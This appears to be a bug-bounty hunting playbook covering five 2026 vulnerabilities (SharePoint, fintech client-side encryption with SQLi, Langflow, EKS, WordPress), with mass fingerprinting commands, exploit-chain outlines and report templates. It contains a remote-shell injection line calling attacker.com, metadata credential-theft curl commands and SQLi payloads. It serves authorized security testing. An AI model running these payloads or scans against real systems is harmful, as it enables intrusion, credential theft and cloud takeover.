# Hunt Playbook — 2026-07-23 Batch

> Five high-signal targets from today's refresh. Fingerprint first, verify safely, report with evidence.

---

## 1. SharePoint Deserialization RCE + Persistent Key (CVE-2026-50522)

**Severity:** Critical · **Status:** PoC available · **Age:** Fresh

### What Makes This Ugly
Exploit gives RCE, but the real damage is the persistent forged authentication key that survives patching. One request owns the farm forever unless defenders rotate keys manually.

### Fingerprinting

```bash
# Tech detection — SharePoint on-prem
cat targets.txt | httpx -tech-detect -title -status-code | grep -i "sharepoint\|microsoftsharepoint"

# Version exposure via _vti_pvt/service.cnf
httpx -path "_vti_pvt/service.cnf" -status-code -title -ms

# Look for older builds (pre-July 2026 patches)
curl -s "https://target.com/_vti_pvt/service.cnf" | grep -i "build"

# Nuclei template check
nuclei -t cves/2026/CVE-2026-50522.yaml -l targets.txt
```

### Hunt Signal — Deserialization Gadgets
```bash
# Look for vulnerable ViewState or __VIEWSTATE parameters
cat urls.txt | grep -E "(__VIEWSTATE|__EVENTVALIDATION)" | head -20

# Check for outdated .NET / ASP.NET headers
curl -I "https://target.com/" | grep -i "x-aspnet-version\|x-powered-by"
```

### Exploit Chain (Theory — Don't Test Without Authorization)
1. **Entry:** Deserialization via user-controlled ViewState or workflow payload
2. **Payload:** ysoserial.net gadget chain → binaryFormatter deserialization
3. **Persistence:** Malicious request plants forged session/key material in config cache
4. **Survival:** Patch removes vulnerability but NOT the planted key

### Defense Verification
```powershell
# Check for unauthorized SPConfig modifications
Get-SPProduct -Local | Where-Object {$_.PatchLevel -lt "16.0.17928"}
Get-SPServiceInstance | Where-Object {$_.TypeName -like "*Workflow*"}
```

### Report Template
- **Impact:** Unauthenticated RCE + persistent backdoor via forged auth keys
- **Evidence:** [source] SharePoint build < 16.0.17928 + PoC request/response
- **Fix:** Patch + manual key rotation + audit for existing forged sessions

---

## 2. Client-Side Encryption Bypass → SQLi (Banking/Fintech Apps)

**Severity:** Critical · **Pattern:** Novel · **Target:** Mobile banking APIs

### What Makes This Work
Apps encrypt params client-side before sending. WAF sees gibberish, lets it through. Reverse the encryption (usually hardcoded key/IV in APK/JS), inject SQLi in plaintext, re-encrypt, fire.

### Fingerprinting

```bash
# Look for mobile banking/fintech apps
# Use recon to find API endpoints with encrypted payloads

# Check for consistent payload patterns (indicates encryption)
cat api-requests.txt | grep -E "^[A-Za-z0-9+/]{100,}={0,2}$" | head -10

# Look for encrypted query parameters (long base64 strings)
cat urls.txt | grep -E "[?&][a-z_]+=[A-Za-z0-9+/]{50,}={0,2}" | head -20

# APK extraction for hardcoded keys
apktool d app.apk -o app-src
grep -r "AES\|DES\|Blowfish\|secretKey\|ivParameter" app-src/smali/ | head -20
```

### Hunt Signal — Crypto in JS/Web
```bash
# Look for cryptoJS or similar in JS bundles
curl -s "https://target.com/app.js" | grep -E "CryptoJS\.AES\|CryptoJS\.DES\|encrypt\|decrypt" | head -10

# Check for hardcoded keys in mobile config
strings app.apk | grep -E "^[a-zA-Z0-9]{16,32}$" | head -20
```

### Exploit Chain (Authorized Testing Only)
1. **Extract:** Pull APK or JS bundle → find encryption algorithm + key/IV
2. **Decrypt:** Capture legitimate request → decrypt to see plaintext structure
3. **Inject:** Modify plaintext with SQLi payload (`' OR 1=1 --`)
4. **Re-encrypt:** Encrypt modified payload with same key/IV
5. **Fire:** Send request → WAF passes → SQLi executes

### Common Patterns Found
```javascript
// Hardcoded key in React Native (common)
const ENCRYPTION_KEY = "MyBank2024Key123"; // 16 bytes = AES-128
const IV = "1234567890123456";

// Or in Java (APK decompile)
private static final String KEY = "banksecret123456";
private static final String IV = "1234567890123456";
```

### Report Template
- **Impact:** WAF bypass → SQLi in critical financial APIs
- **Evidence:** [source] Decryption proof + SQLi confirmation (time delay/error)
- **Fix:** Server-side validation + rotate keys + proper WAF inspection

---

## 3. Langflow AI Framework Unauth RCE (CISA Emergency Directive)

**Severity:** Critical · **Status:** In-the-wild · **Ransomware:** ENCFORGE

### What Makes This Critical
Unauthenticated RCE in MLOps framework. CISA emergency directive = confirmed active exploitation. AI pipelines = cloud creds + model IP + training data goldmine.

### Fingerprinting

```bash
# Shodan query (use responsibly)
shodan search "langflow" --fields ip_str,port,hostnames

# Censys query
censys search "services.http.response.body: 'langflow'"

# Direct endpoint check
httpx -path "/api/v1/flows" -status-code -title -l targets.txt
httpx -path "/api/v1/validate" -status-code -title -l targets.txt

# Version detection (look for < 1.3.0)
curl -s "http://target:7860/api/v1/version" | jq -r '.version'
```

### Hunt Signal — Langflow Artifacts
```bash
# Look for default Langflow ports (7860, 3000, 8080)
cat ips.txt | httpx -ports 7860,3000,8080 -title -tech-detect | grep -i "langflow\|gradio"

# Check for exposed API docs
curl -s "http://target:7860/api/v1/docs" | grep -i "langflow"
```

### Exploit Chain (Emergency — Patch NOW)
1. **Entry:** `/api/v1/validate` or `/api/v1/process` endpoint
2. **Payload:** Python code injection in flow validation
3. **RCE:** `__import__('os').system('curl attacker.com/shell | bash')`
4. **Escalation:** Cloud metadata access → AWS/GCP/Azure creds

### Cloud Metadata Exfil (Post-Exploitation)
```bash
# If you have RCE, grab cloud creds immediately
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/metadata/v1/instance/service-accounts/default/token
```

### Report Template
- **Impact:** Unauth RCE → cloud takeover via metadata service
- **Evidence:** [source] CISA emergency directive + PoC response
- **Fix:** Upgrade to 1.3.0+ + audit for compromise indicators

---

## 4. K8s NodeRestriction Bypass via IAM Spoofing

**Severity:** High · **Pattern:** Confused Deputy · **Target:** AWS EKS

### What Makes This Work
Attacker with IAM permissions can spoof kubelet identity, bypassing NodeRestriction admission plugin. Result: node-level impersonation → pod creation → cert signing → cluster takeover.

### Fingerprinting

```bash
# Identify EKS clusters
cat domains.txt | httpx -title -tech-detect | grep -i "eks\|amazon\|kubernetes"

# Check for exposed kubelet API (usually 10250)
cat ips.txt | httpx -ports 10250 -path "/pods" -status-code -ms

# Look for IAM role indicators in responses
curl -s "https://target.com/api/v1/nodes" -H "Authorization: Bearer $TOKEN" | jq '.items[].spec.providerID'
```

### Hunt Signal — IAM/K8s Integration
```bash
# Check for EC2 instance metadata service (IMDSv1 vulnerable)
cat ips.txt | httpx -path "/latest/meta-data/iam/security-credentials/" -status-code -ms

# Look for aws-auth ConfigMap access
curl -s "https://target.com/api/v1/configmaps/aws-auth" -H "Authorization: Bearer $TOKEN" | jq '.data.mapRoles'
```

### Exploit Chain (Requires IAM Compromise First)
1. **Prereq:** Compromised AWS IAM credentials (from app, Lambda, etc.)
2. **Enumerate:** `aws eks list-clusters` → `aws eks describe-cluster`
3. **Spoof:** Assume node IAM role or create malicious node identity
4. **Bypass:** NodeRestriction sees "legitimate" kubelet → allows pod creation
5. **Escalate:** Create privileged pod → escape to node → get serviceaccount token

### AWS CLI Commands (With Compromised Creds)
```bash
# List EKS clusters
aws eks list-clusters --region us-east-1

# Get cluster details
aws eks describe-cluster --name target-cluster --region us-east-1

# Update kubeconfig (if you have proper IAM)
aws eks update-kubeconfig --name target-cluster --region us-east-1
```

### Report Template
- **Impact:** IAM compromise → full cluster takeover via NodeRestriction bypass
- **Evidence:** [source] IAM policy + node creation proof + pod escape
- **Fix:** Restrict IAM node roles + enable IRSA (IAM Roles for Service Accounts) + audit aws-auth

---

## 5. WP2Shell — WordPress Core Unauth RCE

**Severity:** Critical · **Status:** In-the-wild · **Scope:** All WordPress sites

### What Makes This Critical
Unauthenticated RCE on WordPress core (not plugin). Market share = attack surface is massive. Active exploitation confirmed.

### Fingerprinting

```bash
# Version detection via readme.html
cat urls.txt | httpx -path "/readme.html" -status-code -title -ms | grep -i "wordpress"

# Generator meta tag
cat urls.txt | httpx -path "/" -status-code -title -ms -include-response | grep -i "generator.*wordpress"

# Login page version leak
curl -s "https://target.com/wp-login.php" | grep -oP "ver=\d+\.\d+" | head -1

# Nuclei template (if available)
nuclei -t cves/2026/CVE-2026-XXXXX.yaml -l wordpress-targets.txt
```

### Hunt Signal — WordPress Indicators
```bash
# Look for specific version ranges (vulnerable)
# Based on reports, affects WordPress core < 6.8.2

# Check for wp-cron.php (always present)
cat urls.txt | httpx -path "/wp-cron.php" -status-code | grep -E "200|302"

# XML-RPC (attack vector)
cat urls.txt | httpx -path "/xmlrpc.php" -status-code -ms
```

### Exploit Chain (DO NOT Test Without Permission)
1. **Entry:** Unauthenticated endpoint (likely xmlrpc.php or REST API)
2. **Vector:** Deserialization or file inclusion via block/theme parsing
3. **Payload:** PHP webshell upload or direct RCE
4. **Persistence:** Backdoor in wp-content/uploads or theme files

### Post-Exploitation Indicators
```bash
# Check for suspicious PHP files in uploads
curl -s "https://target.com/wp-content/uploads/" | grep -E "\.php.*\.gif|shell|backdoor"

# Look for modified theme files
curl -s "https://target.com/wp-content/themes/twentytwenty/functions.php" | grep -E "eval\|base64_decode\|system\|exec"
```

### Report Template
- **Impact:** Unauth RCE → full site takeover
- **Evidence:** [source] WordPress version < 6.8.2 + PoC execution proof
- **Fix:** Update to WordPress 6.8.2+ + audit for backdoors + check uploads for PHP

---

## Quick Reference — Hunt Priority

| Target | Signal Strength | Effort | Notes |
|--------|-----------------|--------|-------|
| SharePoint RCE | 4/5 | Medium | Look for on-prem SP, version leaks |
| Client-Side Crypto → SQLi | 4/5 | High | Reverse APK/JS, find hardcoded keys |
| Langflow RCE | 4/5 | Low | Port 7860, /api/v1/flows, CISA confirmed |
| K8s IAM Bypass | 3/5 | High | Requires IAM compromise first |
| WP2Shell | 3/5 | Low | Mass scan WordPress versions |

## Evidence Labels (Required in Reports)

- `[source]` — Direct link to advisory, PoC, or your reproduced evidence
- `[inference]` — Your deduction from the source (explain reasoning)
- `[opinion]` — Your assessment of exploitability/value

## Safety Rules

1. **Never test RCE without explicit authorization**
2. **Use time-delay SQLi** (`sleep(10)`) instead of destructive queries
3. **Document every request** — full HTTP request/response pairs
4. **Stop at proof-of-concept** — no data exfiltration without permission
5. **Report through proper channels** — no public disclosure without coordination

---

*Generated from refresh-latest 2026-07-23. Hunt signal, not noise.*
